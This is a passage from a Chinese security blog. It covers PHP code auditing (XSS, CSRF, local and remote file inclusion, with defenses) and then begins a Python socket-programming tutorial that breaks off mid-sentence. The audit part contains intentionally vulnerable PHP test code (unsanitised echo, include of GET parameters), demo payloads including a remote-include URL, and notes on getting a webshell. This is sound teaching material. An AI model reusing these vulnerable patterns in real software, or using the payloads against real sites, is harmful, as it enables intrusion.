<h4 id="5-2-反射型XSS"><a href="#5-2-反射型XSS" class="headerlink" title="5.2 反射型XSS"></a><strong>5.2 反射型XSS</strong></h4><p>可通过扫描器黑盒直接发现</p>
<p>只需要将&lt;&gt;、‘ 、“ 等题交到Web服务器，检查返回的HTML页面是否保留原来的特殊字符就可以判断</p>
<p>在白盒审计中，只需要寻作带有参数的输出函数，然后根据输出函数对输出内容回溯输入参数，观察是否经过过滤</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
<p>所以可以直接利用GET方式注入代码</p>
<h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>这里代码直接把显示logo的img标签放在span标签的title里面</p>
<p>当鼠标滑过的时候，会调用事件执行显示title，即执行img标签</p>
<p>所以这里的利用点就是可以是HTML实体编码，从而绕过安全检查</p>
<p>在logo处输入 1 oner&114;or=ale &amp; #114;t(1)</p>
<h4 id="5-4-XSS漏洞防范"><a href="#5-4-XSS漏洞防范" class="headerlink" title="5.4 XSS漏洞防范"></a><strong>5.4 XSS漏洞防范</strong></h4><p>特殊字符HTML实体转码</p>
<p>标签事件属性黑白名单</p>
<h3 id="6-CSRF漏洞"><a href="#6-CSRF漏洞" class="headerlink" title="6.CSRF漏洞"></a><strong>6.CSRF漏洞</strong></h3><p>CSRF=Cross-site request forgery 跨站请求伪造</p>
<p>通俗来讲就是劫持其它用户去进行一些请求</p>
<p>简单的攻击流程讲解：</p>
<p>假设直接请求x.com/del.php?id=1 可以删除ID为1的账号，但是需要管理权限</p>
<p>如果在其它网站页面加入&lt; img src=” http: //x.com/del.php?id=1 “&gt;,让管理员打开，就达到目的了</p>
<p>更严重的像添加管理员账号、修改网站配值直接写入webshell等等</p>
<h4 id="6-1-挖掘经验"><a href="#6-1-挖掘经验" class="headerlink" title="6.1 挖掘经验"></a><strong>6.1 挖掘经验</strong></h4><p>CSRF主要是用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台、会员中心</p>
<p>论坛帖子以及交意管理等，管理后台又是最高危的地方</p>
<p>挖掘CSRF的时候，可以先搭好环境，打开几个非静态操作的页面，抓包查看有没有token</p>
<p>如果没有token，直接请求这个页面，不带refer</p>
<p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
<p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
<p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
<p><strong>1.Token验证</strong></p>
<p>token翻译为”标志”，在计算机认证领域叫令牌</p>
<p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
<p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
<p>Token实现测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function set_token()&#123;</span><br><span class="line">	$_SESSION[&#39;token&#39;]&#x3D;md5(time()+rand(1,1000));</span><br><span class="line">&#125;</span><br><span class="line">function check_token()&#123;</span><br><span class="line">	if(isset($_POST[&#39;token&#39;])&amp;&amp;$_POST[&#39;token&#39;]&#x3D;&#x3D;&#x3D;$_SESSION[&#39;token&#39;])</span><br><span class="line">	&#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123; return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_SESSION[&#39;token&#39;])&amp;&amp;check_token())&#123;</span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;failed&quot;;&#125;</span><br><span class="line">set_token();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&lt;?&#x3D;$_SESSION[&#39;token&#39;]?&gt;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">

<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
<p>下面是基于HTTP协议测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>

<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">

<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
<hr>
<h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span> (<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>, <span class="string">'c'</span> =&gt; <span class="keyword">array</span> (<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>));</span><br><span class="line">print_r ($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [a] =&gt; apple [b] =&gt; banana [c] =&gt; <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; x [<span class="number">1</span>] =&gt; y [<span class="number">2</span>] =&gt; z ) )</span><br></pre></td></tr></table></figure>



<h3 id="echo、print、print-r-三者区别"><a href="#echo、print、print-r-三者区别" class="headerlink" title="echo、print、print_r 三者区别"></a><strong>echo、print、print_r 三者区别</strong></h3><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">属性</th>
<th align="center">打印输出</th>
<th align="center">用法</th>
<th align="center">返回值</th>
<th align="center">执行          速率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">PHP语句</td>
<td align="center">输出一个或者多个字符串</td>
<td align="center">echo   或者 echo()</td>
<td align="center">无</td>
<td align="center">最快</td>
</tr>
<tr>
<td align="center">print</td>
<td align="center">实际上不是函数（而是语言结构），所以可以不用圆括号包围参数列表</td>
<td align="center">只能打印出简单类型变量的值(如int,string)</td>
<td align="center">print  或者print()</td>
<td align="center">1</td>
<td align="center">其次</td>
</tr>
<tr>
<td align="center">print_r</td>
<td align="center">函数,语句没有返回值,函数可以有返回值(即便没有用)</td>
<td align="center">可以打印出复杂类型变量的值(如数组,对象)</td>
<td align="center">print_r()</td>
<td align="center">输出成功时，返回true，不成功时返回false</td>
<td align="center">最慢</td>
</tr>
</tbody></table>
<hr>
<h2 id="SQL常用语句解释"><a href="#SQL常用语句解释" class="headerlink" title="SQL常用语句解释"></a>SQL常用语句解释</h2><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>select <strong>id,username</strong> from userinfo  where id=1 <strong>union</strong> select <strong>1,2</strong></p>
<p>注意，union前后的列数要一样！</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-python渗透之路" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/03/12/python%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/"
    >python渗透之路</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/03/12/python%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" class="article-date">
  <time datetime="2020-03-12T02:00:14.000Z" itemprop="datePublished">2020-03-12</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <hr>
<hr>
<h3 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a><strong>python网络编程</strong></h3><h4 id="1-TCP客户端编程"><a href="#1-TCP客户端编程" class="headerlink" title="1.TCP客户端编程"></a>1.TCP客户端编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入socket库:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket:</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>创建Socket时，AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。</p>
<p><strong>SOCK_STREAM指定使用面向流的TCP协议</strong>，这样，一个Socket对象就创建成功，但是还没有建立连接。<br>客户端要主动发起TCP连接，必须知道服务器的IP地址和端口号。<br><strong>作为服务器，提供什么样的服务，端口号就必须固定下来</strong>。由于我们想要访问网页，因此新浪提供网页服务的服务器必须把端口号固定在80端口，<strong>因为80端口是Web服务的标准端口</strong>。</p>
<p>其他服务都有对应的标准端口号,例如SMTP服务是25端口，FTP服务是21端口，等等。</p>
<p>端口号小于1024的是Internet标准服务的端口，端口号大于1024的，可以任意使用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>

<p>注意参数是一个<code>tuple</code>（元组），包含地址和端口号。</p>
<p>建立TCP连接后，我们就可以向新浪服务器发送请求，要求返回首页的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送数据:</span></span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n'</span>)</span><br></pre></td></tr></table></figure>

<p>TCP连接创建的是双向通道，双方都可以同时给对方发数据。但是谁先发谁后发，怎么协调，要根据具体的协议来决定。例如，HTTP协议规定客户端必须先发请求给服务器，服务器收到后才发数据给客户端。</p>
<p>发送的文本格式必须符合HTTP标准，如果格式没问题，接下来就可以接收新浪服务器返回的数据了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接收数据:</span></span><br><span class="line">buffer = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 每次最多接收1k字节:</span></span><br><span class="line">    d = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">b''</span>.join(buffer)</span><br></pre></td></tr></table></figure>

<p>接收数据时，调用<code>recv(max)</code>方法，一次最多接收指定的字节数，因此，在一个while循环中反复接收，直到<code>recv()</code>返回空数据，表示接收完毕，退出循环。</p>
<p>当我们接收完数据后，调用<code>close()</code>方法关闭Socket，这样，一次完整的网络通信就结束了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关闭连接:</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>接收到的数据包括HTTP头和网页本身，我们只需要把HTTP头和网页分离一下，把HTTP头打印出来，网页内容保存到文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">header, html = data.split(<span class="string">b'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment"># 把接收的数据写入文件:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'sina.html'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>现在，只需要在浏览器中打开这个<code>sina.html</code>文件，就可以看到新浪的首页了。</p>
<p>需要注意的是，直接访问新浪会返回301，重定向到https:sina.com.cn，所以这里需要进行HTTPS连接，改为443端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">s=ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM))</span><br><span class="line"><span class="comment">#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">s.connect((<span class="string">'www.orld.top'</span>,<span class="number">443</span>))</span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.orld.top\r\n\r\n'</span>)</span><br><span class="line"><span class="comment">#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0\r\n</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"ok:"</span>)</span><br><span class="line">buffer=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d=s.recv(<span class="number">8192</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        print(d)</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data=<span class="string">b''</span>.join(buffer)</span><br><span class="line">s.close()</span><br><span class="line">header,html=data.split(<span class="string">b'\r\n\r\n'</span>,<span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:/Users/最恐怖的小怪兽/Desktop/123.html'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx</span><br><span class="line"><span class="attribute">Date</span>: Sat, 21 Mar 2020 12:29:16 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 539941</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">ETag</span>: "5e760817-7ea13"V=CCD0B746</span><br><span class="line"><span class="attribute">X-Powered-By</span>: shci_v1.03</span><br><span class="line"><span class="attribute">Expires</span>: Sat, 21 Mar 2020 12:29:23 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=60</span><br><span class="line"><span class="attribute">X-Via-SSL</span>: ssl.25.sinag1.yzyh.lb.sinanode.com</span><br><span class="line"><span class="attribute">Age</span>: 53</span><br><span class="line"><span class="attribute">Via</span>: https/1.1 ctc.guangzhou.union.182 (ApacheTrafficServer/6.2.1 [cRs f ]), https/1.1 cnc.guangzhou.union.69 (ApacheTrafficServer/6.2.1 [cRs f ])</span><br><span class="line"><span class="attribute">X-Via-Edge</span>: 1584793756134266f61d3f0065a703ed25d82</span><br><span class="line"><span class="attribute">X-Cache</span>: HIT.69</span><br><span class="line"><span class="attribute">X-Via-CDN</span>: f=edge,s=cnc.guangzhou.union.73.nb.sinaedge.com,c=211.97.111.38;f=edge,s=cnc.guangzhou.union.69.nb.sinaedge.com,c=112.90.6.73;f=Edge,s=cnc.guangzhou.union.69,c=112.90.6.69</span><br></pre></td></tr></table></figure>

<h4 id="2-TCP服务器编程"><a href="#2-TCP服务器编程" class="headerlink" title="2.TCP服务器编程"></a><strong>2.TCP服务器编程</strong></h4><p>和客户端编程相比，服务器编程就要复杂一些。</p>
<p>服务器进程首先要绑定一个端口并监听来自其他客户端的连接。如果某个客户端连接过来了，服务器就与该客户端建立Socket连接，随后的通信就靠这个Socket连接了。</p>
<p>所以，服务器会打开固定端口（比如80）监听，每来一个客户端连接，就创建该Socket连接。由于服务器会有大量来自客户端的连接，所以，服务器要能够区分一个Socket连接是和哪个客户端绑定的。</p>
<p><strong>一个Socket依赖4项：服务器地址、服务器端口、客户端地址、客户端端口来唯一确定一个Socket。</strong></p>
<p>但是服务器还需要同时响应多个客户端的请求，所以，<strong>每个连接都需要一个新的进程或者新的线程来处理</strong>，否则，服务器一次就只能服务一个客户端了。</p>
<p>我们来编写一个简单的服务器程序，它接收客户端连接，把客户端发过来的字符串加上<code>Hello</code>再发回去。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"waiting for connection ..."</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock,addr=s.accept()</span><br><span class="line">        t=threading.Thread(target=tcplink,args=(sock,addr))</span><br><span class="line">        t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connection from %s:%s...'</span>%addr)</span><br><span class="line">    sock.send(<span class="string">b'welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>)==<span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello,%s!'</span> % data.decode(<span class="string">'utf-8'</span>)).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    sock.close()<span class="comment">#注意等循环结束再关闭</span></span><br><span class="line">    print(<span class="string">'connetion from %s:%s closed'</span>%addr)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server()</span><br></pre></td></tr></table></figure>

<p>客户端发送数据检测：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>首先，创建一个基于IPv4和TCP协议的Socket：</p>
